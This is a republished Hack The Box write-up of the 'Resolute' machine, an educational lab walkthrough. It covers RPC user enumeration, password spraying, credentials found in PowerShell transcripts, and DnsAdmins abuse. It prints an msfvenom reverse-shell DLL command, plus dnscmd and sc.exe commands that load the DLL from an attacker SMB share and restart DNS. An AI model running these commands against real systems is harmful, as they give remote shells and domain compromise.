# :game_die: HTB | Resolute — DnsAdmins Abuse

> **Original Source:** [HTB | Resolute — DnsAdmins Abuse](https://infosecwriteups.com/htb-resolute-dnsadmins-abuse-24e2aa93c8f2)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# HTB | Resolute — DnsAdmins Abuse


This is the Box on [Hack The Box Active Directory 101 Track](https://app.hackthebox.com/tracks/Active-Directory-101). Find the box [here](https://app.hackthebox.com/machines/220).


Watch my video writeup of Resolute on YouTube: [AnuragSec](https://www.youtube.com/watch?v=A-xD1sCClnM)


### Skill Learned


## NMAP


IP: 10.10.10.169


```
nmap -sT -p- --kin-rate 10000 10.10.10.169
```


*nmap*

## SMB & RPC — TCP 445


Without credentials, I was not able to enum any shares


I was able to null connect via `rpcclient` and able to enumerate


I can get information about the users one by one with `queryuser`:


```
queryuser 0x1f4
```


*queryuser 0x1f4*


I can also get less information about all users with `querydispinfo`:


*querydispinfo*


We found the password for *marko*

## Foothold/shell


I’ll use crackmapexec as an easy way to check credentials against SMB. First I try as marko, but it doesn’t work:


I tried connecting with EvilWinRM as well, but no luck.


Password Spray


Password spraying is similar to password brute force, except you only try one (or a few common passwords) across a lot of users. The benefit to the attacker is that you don’t risk locking out any single account, and in a case where you only need a foothold, it’s very common in a large organization to find at least one user using a really bad guessable password.


I grabbed the list of users from rpcclient, and dropped them into a file. Then I ran crackmapexec using that list as the user input. It found a user still using *Welcome123!*:


we found a valid login


WinRM shell


## Get anuragtaparia’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


I don’t know if Malanie is an administrator or in the Remote Management Users group, but it’s worth a shot to see if I can EvilWinRM to get a shell as Melanie. It works:


and now we have user.txt

*user.txt*

## Priv Esc


In PowerShell, `ls` is an alias for `Get-ChildItem` or `gci`. On Windows, it’s often a good idea to run that with *-force*, kind of like running *ls -a*.

*ls -force*


PSTranscripts looks interesting


```
gci -recurse -force file PSTranscripts
```


*gci -recurse -force file PSTranscripts*


On looking at the text file inside PSTranscripts we found Ryan’s password


*Ryan’s password*


On looking at user Ryan we can see that Ryan actually isn’t in Remote Management Users. But he is in Contractors, and Contractors is:

*net user ryannet localgroup Contractors and net localgroup “Remote Management Users”*


From my Kali box, I can also check the creds with crackmapexec:


we can use evilWinRm and we are in as Ryan


We saw note.txt


On looking at `whoami /priv` and `whoami /groups`


## DnsAdmins


Members of the DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. By default, the DNSAdmins don’t have the ability to start or stop the DNS service, but it’s not unusual for an admin to give this group that privilege.


The attack here is to tell the DNS service on Resolute to use my dll as a plugin. I’m going to use *msfvenom* to create a dll that will, on loading, connect back to me. When *msfvenom* creates this payload, it will connect back, and wait for that session to end before continuing. This will hang the DNS service on Resolute. That’s fine for a CTF, but would make for a bad day in a real pentest.


To get around this, you can create a payload that starts the reverse shell in a new thread and then continues so that the DNS server can continue to start.


Check [abusing dnsadmins privilege for escalation in active directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), [feature not bug — dnsadmin to dc compromise](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83) and [dnsAdmin Privesc in AD](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2) for more information


Now I’ll start with a basic msfvenom reverse shell payload as a dll. Defender is running on this host, and if I put the output file there, it might get detected, but over a UNC path to a share it might be ok.


```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f dll -o rev.dll
```


Now I will start the smb server.


Now it’s time to upload and execute. I’ll need to run three commands:


- Set the server-level plugin to be rev.dll on my share.


```
dnscmd.exe /config /serverlevelplugindll \\10.10.14.4\s\rev.dll
```


```
sc.exe \\resolute stop dns
```


```
sc.exe \\resolute start dns
```


I’ll need to do this all within a minute (or less) because, as note.txt told me, things revert quickly.


With nc listening, I execute the attack:


after starting DNS I got the shell


and we have the root.txt

*root.txt*


If you enjoyed this article and want to dive deeper into cybersecurity topics, feel free to explore my detailed write-ups on GitBook. I cover a range of topics including vulnerability assessments, penetration testing techniques, and security methodologies.


👉 [Check out my GitBook for more insights](https://anuragtaparia.gitbook.io/write-ups)


👉 Watch my videos on YouTube: [AnuragSec](http://www.youtube.com/@AnuragSec)


Stay tuned for more content, and don’t forget to follow for future updates!


Stay tuned for more content, and don’t forget to follow for future updates!

---

*Originally published on [Medium](https://infosecwriteups.com/htb-resolute-dnsadmins-abuse-24e2aa93c8f2). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
